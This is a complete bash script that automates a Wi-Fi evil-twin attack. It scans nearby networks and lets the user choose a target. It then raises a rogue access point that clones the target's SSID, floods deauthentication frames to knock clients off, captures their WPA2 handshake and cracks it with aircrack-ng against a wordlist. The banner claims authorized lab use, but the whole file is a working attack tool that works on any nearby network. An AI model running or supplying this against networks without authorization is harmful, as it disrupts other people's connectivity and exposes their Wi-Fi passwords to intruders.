#!/usr/bin/env bash
# evil-twin.sh - evil-twin (rogue AP) handshake capture for authorized testing
#
#   Monitor your own AP, spin up a rogue AP with the SAME SSID on the same
#   channel, then deauth the real AP's clients. When they auto-reconnect they
#   may land on the rogue AP and perform a 4-way handshake we capture.
#
#   Note: the handshake alone still never reveals the password - it only gets
#   verified against a wordlist afterwards (same as any other WPA2 capture).
#
# Usage:
#   sudo ./evil-twin.sh <iface> [essid] [channel]
#   sudo ./evil-twin.sh wlx2887baafa344 "Starlink_Main" 11
#
# Requires a card/driver able to run monitor + AP on two vifs at once
# (e.g. a second dongle, or iwlwifi/ath9k). rtw88-usb usually CANNOT - the
# script then falls back to a plain targeted-deauth capture (option-2 style).

set -u

C=$'\033[0;36m'; G=$'\033[0;32m'; Y=$'\033[0;33m'; R=$'\033[0;31m'; X=$'\033[0m'
cyan()   { echo -e "${C}$*${X}"; }
green()  { echo -e "${G}$*${X}"; }
yellow() { echo -e "${Y}$*${X}"; }
red()    { echo -e "${R}$*${X}" >&2; }
die()    { red "$*"; exit 1; }
need()   { command -v "$1" >/dev/null 2>&1 || { red "\"$1\" not installed"; exit 1; }; }

IFACE="${1:-}"
ET_SSID="${2:-}"
ET_CH="${3:-}"
OUT="/root/lab"
MON="" AP="" APIF="" MONIF=""
DUMP_PID="" HOSTAPD_PID="" AIRE_PID=""
CAPFILE=""
RMOD_RELOADED=0

banner() {
    echo "  ------------------------------------------------"
    echo "   Evil-Twin (rogue AP) Handshake Capture - Lab"
    echo "   Use only on networks you own / are authorized"
    echo "  ------------------------------------------------"
}

# rtw88-family USB cards go deaf after interface churn until the module stack
# is reloaded; do it once per run, before we start adding/removing interfaces.
rtw88_reload() {
    local drv
    drv="$(basename "$(readlink "/sys/class/net/$IFACE/device/driver" 2>/dev/null)" 2>/dev/null)"
    case "$drv" in
        rtw88_8821au|rtw88_8812au|rtw88_8814au)
            [[ $RMOD_RELOADED -eq 1 ]] && return
            yellow "[*] $drv: reloading module stack to avoid the monitor-RX stall..."
            for m in $(lsmod | awk '/^rtw/{print $1}'); do rmmod "$m" 2>/dev/null || true; done
            modprobe "$drv"
            sleep 3
            RMOD_RELOADED=1
            ;;
    esac
}

is_hs() { aircrack-ng "$1" 2>/dev/null | grep -qE 'WPA \([1-9][0-9]* handshake'; }

# find a wordlist: saved setting first, then common paths
resolve_wordlist() {
    local w
    for w in "${SAVED_WORDLIST:-}" "$HOME/rockyou.txt" "$HOME/.wordlist.txt" \
             /usr/share/wordlists/rockyou.txt /usr/share/wordlists/Pwdb_top-100000.txt; do
        [[ -n "$w" && -f "$w" ]] && { echo "$w"; return; }
    done
}

crack_it() {
    local f="$1" wl res key
    wl="$(resolve_wordlist)"
    if [[ -z "$wl" ]]; then
        read -r -p "[>] Wordlist path (ENTER to skip cracking): " wl
        [[ -n "$wl" ]] || return
    fi
    [[ -f "$wl" ]] || { yellow "    wordlist not found: $wl"; return; }
    cyan "[*] Cracking $f with $(basename "$wl") - may take a while..."
    res="$(aircrack-ng -w "$wl" "$f" 2>/dev/null)"
    if grep -q 'KEY FOUND' <<<"$res"; then
        key="$(grep -oE 'KEY FOUND! \[ [^]]+ \]' <<<"$res" | head -1)"
        green "[+] $key"
        grep -E 'Network Name:|BSSID|ESSID' <<<"$res" | head -2
    else
        yellow "[-] Passphrase not in $wl."
    fi
}

find_target() {
    need airodump-ng
    local csv tag line
    if [[ -z "$ET_SSID" ]]; then
        yellow "[*] Scanning for networks (~12s) to pick a target..."
        tag="$(mktemp /tmp/et-scan.XXXXXX)"
        airodump-ng --band bg -w "$tag" --output-format csv "$IFACE" >/dev/null 2>&1 & 
        sleep 12
        pkill -f "airodump-ng --band bg -w $tag" 2>/dev/null || true
        csv="${tag}-01.csv"
        [[ -f "$csv" ]] || die "scan produced no output (monitor RX?)"
        i=0
        declare -a SB=() SC=() SE=()
        while IFS= read -r line; do
            [[ "$line" =~ ^[0-9A-Fa-f]{2}: ]] || continue
            [[ "$(echo "$line" | cut -d, -f14 | tr -d ' ')" == "" ]] && continue
            SB+=("$(echo "$line" | cut -d, -f1 | tr -d ' ')")
            SC+=("$(echo "$line" | cut -d, -f4 | tr -d ' ')")
            SE+=("$(echo "$line" | cut -d, -f14 | tr -d ' ')")
            i=$((i+1))
        done < "$csv"
        [[ $i -gt 0 ]] || die "no networks seen"
        echo; cyan "[*] Networks:"
        local n
        for n in "${!SB[@]}"; do
            printf "  %2d) %-17s  ch %-4s '%s'\n" "$((n+1))" "${SB[$n]}" "${SC[$n]}" "${SE[$n]}"
        done
        read -r -p "[>] Pick target: " pick
        [[ "$pick" =~ ^[0-9]+$ ]] && [[ "$pick" -ge 1 ]] && [[ "$pick" -le $i ]] || die "bad choice"
        REAL_BSSID="${SB[$((pick-1))]}"
        ET_CH="${SC[$((pick-1))]}"
        ET_SSID="${SE[$((pick-1))]}"
    else
        # essid given: derive bssid + channel from a short scan
        tag="$(mktemp /tmp/et-scan.XXXXXX)"
        airodump-ng --band bg -w "$tag" --output-format csv "$IFACE" >/dev/null 2>&1 &
        sleep 10
        pkill -f "airodump-ng --band bg -w $tag" 2>/dev/null || true
        csv="${tag}-01.csv"
        [[ -f "$csv" ]] || die "scan produced no output"
        while IFS= read -r line; do
            [[ "$line" =~ ^[0-9A-Fa-f]{2}: ]] || continue
            [[ "$(echo "$line" | cut -d, -f14 | tr -d ' ')" == "$ET_SSID" ]] || continue
            REAL_BSSID="$(echo "$line" | cut -d, -f1 | tr -d ' ')"
            [[ -z "$ET_CH" ]] && ET_CH="$(echo "$line" | cut -d, -f4 | tr -d ' ')"
            break
        done < "$csv"
        [[ -n "${REAL_BSSID:-}" ]] || die "'$ET_SSID' not seen in scan"
    fi
    green "[+] Target: $REAL_BSSID  ch ${ET_CH}  '$ET_SSID'"
}

new_mac() {
    # locally-administered unicast MAC (starts 02:)
    local a b c d e
    read -r a b c d e < <(head -c5 /dev/urandom | od -An -tx1)
    printf '02:%s:%s:%s:%s:%s' "$a" "$b" "$c" "$d" "$e"
}

setup_vifs() {
    local ok=0
    MONIF="${IFACE}-mon"
    APIF="${IFACE}-ap"
    MON="$(new_mac)" AP="$(new_mac)"
    ip link set "$IFACE" down
    if iw dev "$IFACE" interface add "$MONIF" type monitor addr "$MON" >/dev/null 2>&1 \
       && iw dev "$IFACE" interface add "$APIF" type __ap addr "$AP" >/dev/null 2>&1; then
        ok=1
        green "[+] Concurrent vifs OK: monitor=$MONIF ap=$APIF"
    else
        ip link del "$MONIF" 2>/dev/null || true
        ip link del "$APIF" 2>/dev/null || true
        yellow "[-] Driver cannot host monitor+AP at once on this card."
        yellow "    Options: attach a second dongle and rerun with it, or"
        yellow "    run WITHOUT the rogue AP (plain targeted-deauth capture)."
        read -r -p "[>] Run 'deauth-only' mode anyway? (y/N): " go
        [[ "${go,,}" == "y" ]] || { ip link set "$IFACE" up; die "aborted"; }
        MONIF="$IFACE"      # single iface, monitor only
        APIF=""
        ip link set "$IFACE" up
        OK_DEAUTH_ONLY=1
    fi
}

start_capture() {
    need airodump-ng
    local ts ch="$1"
    ts="$(date +%H%M%S)"
    TAG="$(printf '%s' "${ET_SSID:-unknown}" | tr -cd 'A-Za-z0-9_.-' | cut -c1-20)"
    [[ -n "$TAG" ]] || TAG="unknown"
    CAPBASE="${OUT}/${TAG}_et-${ts}"
    # capture the whole channel: clients may handshake with the rogue AP OR
    # (when 802.11w blocks the deauth) fall back to the real AP - catch both.
    airodump-ng -c "$ch" -w "$CAPBASE" \
        --output-format pcap,csv "$MONIF" </dev/null >/dev/null 2>&1 &
    DUMP_PID=$!
    sleep 3
}

start_rogue_ap() {
    need hostapd
    local conf pass
    pass="et_lab_$(head -c4 /dev/urandom | od -An -tx1 | tr -d ' ')"
    conf="$(mktemp /tmp/et-hostapd.XXXXXX)"
    cat > "$conf" <<EOF
interface=$APIF
driver=nl80211
ssid=$ET_SSID
hw_mode=g
channel=$ET_CH
wpa=2
wpa_passphrase=$pass
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
ignore_broadcast_ssid=0
EOF
    yellow "[*] Rogue AP '${ET_SSID}' up as $APIF (ch $ET_CH)..."
    hostapd "$conf" >/tmp/et-hostapd.log 2>&1 &
    HOSTAPD_PID=$!
    sleep 4
    kill -0 "$HOSTAPD_PID" 2>/dev/null || { red "hostapd failed:"; tail -5 /tmp/et-hostapd.log; return 1; }
    green "[+] Rogue AP broadcasting"
}

deauth_loop() {
    need aireplay-ng
    local got=0 rounds=0 i n cont="" st csv from
    while [[ $got -eq 0 ]]; do
        for i in $(seq 1 12); do
            [[ -e "${CAPBASE}-01.cap" ]] || break
            is_hs "${CAPBASE}-01.cap" && { got=1; break; }
            csv="${CAPBASE}-01.csv"
            if [[ -n "$APIF" ]]; then
                # force clients toward OUR rogue AP: broadcast boots them off
                aireplay-ng -0 2 -a "$REAL_BSSID" "$MONIF" >/dev/null 2>&1 || true
                yellow "   [${i}x5s] broadcast deauth -> clients should fall to rogue AP"
            else
                # deauth-only: targeted per client (like option 2)
                ST=()
                if [[ -f "$csv" ]]; then
                    st=0
                    while IFS= read -r from; do
                        [[ "$from" == *"Station MAC"* ]] && { st=1; continue; }
                        [[ $st -eq 1 ]] || continue
                        [[ "$from" =~ ^[0-9A-Fa-f:]{17} ]] && ST+=("$(cut -d, -f1 <<<"$from" | tr -d ' ')")
                    done < "$csv"
                fi
                if [[ ${#ST[@]} -gt 0 ]]; then
                    for from in "${ST[@]}"; do aireplay-ng -0 2 -a "$REAL_BSSID" -c "$from" "$MONIF" >/dev/null 2>&1 || true; done
                    yellow "   [${i}x5s] targeted deauth of ${#ST[@]} client(s)"
                else
                    aireplay-ng -0 2 -a "$REAL_BSSID" "$MONIF" >/dev/null 2>&1 || true
                    yellow "   [${i}x5s] broadcast deauth (no clients listed)"
                fi
            fi
            sleep 5
        done
        [[ $got -eq 1 ]] && break
        rounds=$((rounds+1))
        if [[ -e "${CAPBASE}-01.cap" ]] && is_hs "${CAPBASE}-01.cap"; then got=1; break; fi
        read -r -p "[>] No handshake after $((rounds*60))s. Keep attacking? (y/N): " cont
        [[ "${cont,,}" == "y" ]] || break
    done
    green "[+] Capture complete. Stopped the attack."
}

cleanup() {
    [[ -n "$DUMP_PID" ]] && kill "$DUMP_PID" 2>/dev/null
    [[ -n "$HOSTAPD_PID" ]] && kill "$HOSTAPD_PID" 2>/dev/null
    pkill -f "aireplay-ng -0" >/dev/null 2>&1 || true
    sleep 1
    [[ "$MONIF" != "$IFACE" ]] && { ip link del "$MONIF" 2>/dev/null || true; }
    [[ -n "$APIF" ]] && [[ "$APIF" != "$IFACE" ]] && { ip link del "$APIF" 2>/dev/null || true; }
    ip link set "$IFACE" up 2>/dev/null || true
    pkill -f "airodump-ng -c $ET_CH" >/dev/null 2>&1 || true
}

main() {
    banner
    [[ $EUID -eq 0 ]] || die "Run with sudo: sudo $0 <iface> [essid] [channel]"
    [[ -n "$IFACE" ]] || { echo "Usage: sudo $0 <iface> [essid] [channel]"; exit 1; }
    [[ -e "/sys/class/net/$IFACE" ]] || die "Interface $IFACE not found"
    mkdir -p "$OUT"
    trap cleanup EXIT

    for t in aircrack-ng airodump-ng aireplay-ng iw; do need "$t"; done

    rtw88_reload

    yellow "[*] Setting $IFACE to monitor..."
    ip link set "$IFACE" down
    iw dev "$IFACE" set type monitor 2>/dev/null || die "cannot set monitor mode"
    ip link set "$IFACE" up

    find_target

    OK_DEAUTH_ONLY=0
    setup_vifs
    if [[ -n "$APIF" ]]; then
        iw dev "$MONIF" set channel "$ET_CH" 2>/dev/null || true
        ip link set "$MONIF" up
        ip link set "$APIF" up
        start_rogue_ap || { read -r -p "[>] hostapd failed - run deauth-only? (y/N) " go; [[ "${go,,}" == "y" ]] || die "aborted"; APIF=""; MONIF="$IFACE"; ip link set "$IFACE" up; }
    fi

    start_capture "$ET_CH"
    green "[+] Capturing channel $ET_CH -> ${CAPBASE}-01.cap"
    echo "[*] Watch for:  WPA handshake"
    echo "[*] If nothing, toggle a client's WiFi to force a reconnect."
    deauth_loop
    cleanup

    CAPFILE="${CAPBASE}-01.cap"
    if [[ -e "$CAPFILE" ]] && is_hs "$CAPFILE"; then
        green "[+] Evil-twin handshake captured: $CAPFILE"
        aircrack-ng "$CAPFILE" | grep -E 'WPA \([1-9][0-9]* handshake' || true
    else
        red "[-] No handshake captured in $OUT."
        yellow "    Causes: 802.11w/PMF clients ignore deauth, client on the OTHER"
        yellow "    radio (5GHz vs 2.4GHz), or nothing reconnected during the run."
    fi
    read -r -p "[>] Crack the capture now? (y/N): " ok
    [[ "${ok,,}" == "y" ]] && crack_it "$CAPFILE"
}

main "$@"